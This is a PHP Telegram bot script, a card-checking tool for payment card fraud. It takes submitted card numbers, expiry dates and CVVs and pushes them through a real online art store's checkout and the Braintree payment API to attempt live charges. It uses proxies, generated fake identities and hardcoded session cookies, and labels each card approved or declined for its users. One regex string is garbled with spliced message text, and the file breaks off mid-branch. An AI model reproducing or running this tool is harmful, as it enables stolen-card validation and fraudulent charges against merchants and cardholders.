<?php


$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nR
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: Unregistered User! ⚠️
[↯]Message: You have to register first to use me
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -ank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}

if((strpos($text, '/btr') === 0) or (strpos($text, '.btr') === 0) or ((strpos($text, '$btr') === 0) or (strpos($text, '!btr') === 0)) or ((strpos($text, '+btr') === 0) or (strpos($text, '#btr') === 0)) or (strpos($text, '?btr') === 0)) {


$userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}


if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Braintree</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}  

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}
  
$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (!preg_match($pattern, $paidData, $matches) && !in_array($chatId, $owners)) {

if (!in_array($chatId, $authgrps)) {
      
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Not Allowed Here!⚠️</code>
[↯]Message: <code>Contact the Owner to authorize</code>
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
    }
}

$spamWaitTime = isSpamming($userId);
if ($spamWaitTime !== false) {
bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamWaitTime seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
}


  


$start_time = microtime(true);

$messageidtoedit4 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtovbv = capture(json_encode($messageidtoedit4), '"message_id":', ',');
        
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}



$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


$last4 = substr($cc, -4);

//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',
            
        ]);
return;
}

//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);



function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  
  
  
  
  function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];





//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

  
//==============[Randomizing Details-END]======================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//==================[BIN LOOK-UP]======================//
$fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
$bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];
        
        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
    }
//==================[BIN LOOK-UP-END]======================//

 bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.countereditions.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuY291bnRlcmVkaXRpb25zLmNvbS9vZmZlcnMvcG9rZW1vbi1wb3J0cmFpdHMtMjAyMi9kaXR0by02MDc0Lmh0bWw%2C/product/1584/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.countereditions.com';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: multipart/form-data; boundary=----'.$web.'';
$headers[] = 'Path: /checkout/cart/add/uenc/aHR0cHM6Ly93d3cuY291bnRlcmVkaXRpb25zLmNvbS9vZmZlcnMvcG9rZW1vbi1wb3J0cmFpdHMtMjAyMi9kaXR0by02MDc0Lmh0bWw%2C/product/1584/';
$headers[] = 'Cookie: private_content_version=612e70c455650fda61dde36571faca4c; PHPSESSID=rvro8e3r1eludr9764oiomg0q0; form_key=TvxQ63O7r9zawhmH; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; searchReport-log=0';
$headers[] = 'Origin: https://www.countereditions.com';
$headers[] = 'Referer: https://www.countereditions.com/offers/pokemon-portraits-2022/ditto-6074.html';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';
$headers[] = 'X-Requested-With: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------'.$web.'
Content-Disposition: form-data; name="product"

1584
------'.$web.'
Content-Disposition: form-data; name="selected_configurable_option"


------'.$web.'
Content-Disposition: form-data; name="related_product"


------'.$web.'
Content-Disposition: form-data; name="item"

1584
------'.$web.'
Content-Disposition: form-data; name="form_key"

TvxQ63O7r9zawhmH
------'.$web.'
Content-Disposition: form-data; name="qty"

1
------'.$web.'--
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.countereditions.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.countereditions.com';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Path: /checkout/';
$headers[] = 'Cookie: PHPSESSID=rvro8e3r1eludr9764oiomg0q0; form_key=TvxQ63O7r9zawhmH; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; searchReport-log=0; form_key=TvxQ63O7r9zawhmH; private_content_version=4da55250a02feda725e0321c38f9310f; section_data_ids=%7B%22cart%22%3A1694519408%2C%22directory-data%22%3A1694518396%2C%22cartdash%22%3A1694519396%2C%22messages%22%3Anull%7D';
$headers[] = 'Referer: https://www.countereditions.com/checkout/cart/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

$merchant = trim(strip_tags(getStr($result1, '"merchantId":"','"')));

// ENCODED BEARER
$enbearer = trim(strip_tags(getstr($result1, '"clientToken":"','",')));

// DECODED BEARER
$decode = base64_decode($enbearer);

// MAIN BEARER
$bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));
//echo "bearer: $bearer <br>";
//echo "merchant: $merchant <br>";


//=======================[5 REQ]==================================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


//-------------------Req 2--------------//
//=================REQ 4===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: payments.braintree-api.com';
$headers[] = 'path: /graphql';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.5';
$headers[] = 'content-type: application/json';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'origin: https://assets.braintreegateway.com';
$headers[] = 'referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"d1619f02-e99f-4955-916d-050c740bfe2e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result3 = curl_exec($ch);
$token = trim(strip_tags(getstr($result3, '"token":"','"')));


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://www.countereditions.com';
$headers[] = 'Referer: https://www.countereditions.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"6958.33","additionalInfo":{"billingLine1":"5th Ave","billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US","billingPhoneNumber":"9234737272","billingGivenName":"'.$firstname.'","billingSurname":"'.$lastname.'"},"dfReferenceId":"0_180c1931-5931-4378-a7c1-d478bc470e43","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":453},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"www.countereditions.com","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"d1619f02-e99f-4955-916d-050c740bfe2e"}}
');

$lookup = curl_exec($ch);
$status = trim(strip_tags(getstr($lookup, '"status":"','"')));
$enrolled = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"enrolled":"','"')))));
$nonce = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"nonce":"','"')))));

if ($status == "authenticate_successful") {
    $status = $status . " ✅";
    }
elseif ($status == "authenticate_attempt_successful") {    
    $status = $status . " ✅";
    } 
else {
    $status = $status . " ❌";
    }


//========REQ 2 END ==========//
//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.countereditions.com/rest/default/V1/guest-carts/swnVF5cusXzC1U9BkZi7HdGTPyosQki8/payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: www.countereditions.com';
$headers[] = 'path: /rest/default/V1/guest-carts/swnVF5cusXzC1U9BkZi7HdGTPyosQki8/payment-information';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.5';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: PHPSESSID=rvro8e3r1eludr9764oiomg0q0; form_key=TvxQ63O7r9zawhmH; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; searchReport-log=0; form_key=TvxQ63O7r9zawhmH; private_content_version=c5cd555eb05b512c071156e6461e67c0; section_data_ids=%7B%22cart%22%3A1694519565%2C%22directory-data%22%3A1694518396%2C%22cartdash%22%3A1694518565%2C%22messages%22%3A1694518565%7D';
$headers[] = 'origin: https://www.countereditions.com';
$headers[] = 'referer: https://www.countereditions.com/checkout/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 
$headers[] = 'x-requested-with: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethod":{"extension_attributes":{"agreement_ids":["1"]},"method":"braintree","additional_data":{"payment_method_nonce":"'.$nonce.'","device_data":"{\"device_session_id\":\"90beecc242d77e61050865de5595b674\",\"correlation_id\":\"193ea82e1a5e1dad8121ac102987aebc\"}"}},"registration":{"iosc-register-pwd":"","iosc-register-pwd-confirm":""},"shippingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["5th Ave"],"telephone":"9234737272","postcode":"10080","city":"New York","firstname":"'.$lastname.'","lastname":"'.$firstname.'","saveInAddressBook":null,"extension_attributes":{"isUseBillingAddress":"0"}},"shippingMethod":{"shipping_method_code":"amstrates1","shipping_carrier_code":"amstrates"},"subscribe":{"subscribeToNewsletter":false},"customerEmail":"'.$email.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["5th Ave"],"telephone":"9234737272","postcode":"10080","city":"New York","firstname":"'.$firstname.'","lastname":"'.$lastname.'","saveInAddressBook":null,"extension_attributes":{"isUseBillingAddress":"0"}},"cartId":"swnVF5cusXzC1U9BkZi7HdGTPyosQki8","email":"'.$email.'"}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result5 = curl_exec($ch);
$response_array = json_decode($result5, true);

if ($response_array !== null) {
    $msg = $response_array['message'];
    //echo $msg;
} else {
    //echo "Error decoding JSON.";
}

//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//=============CHECKER PART END============//

if(strpos($result5, "Thank you.")) {

$status = ("Approved ✅");  
$respo = ("Charged 800$");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Insufficient Funds")) {
$status = ("Approved ✅");  
$respo = ("Insufficient funds");
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV")) {
$status = ("Approved ✅");  
$respo = ("Card Issuer Declined CVV");
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Call Issuer. Pick Up Card.")) {
$status = ("Declined ❌");  
$respo = ("Pick Up Card");
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Declined - Call Issuer")) {
$status = ("Declined ❌");  
$respo = ("Declined - Call Issuer");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Issuer or Cardholder has put a restriction on the card")) {
$status = ("Declined ❌");  
$respo = ("Issuer or Cardholder has put a restriction on the card");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot determine payment method.")) {
$status = ("Declined ❌");  
$respo = ("Cannot determine payment method");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Do Not Honor")) {
$status = ("Declined ❌");  
$respo = ("Do Not Honor");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Card Not Activated")) {
$status = ("Declined ❌");  
$respo = ("Card Not Activated");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Closed Card")) {
$status = ("Declined ❌");  
$respo = ("Closed Card");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: risk_threshold")) {
$status = ("Declined ❌");  
$respo = ("Gateway Rejected: risk_threshold");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Life cycle)")) {
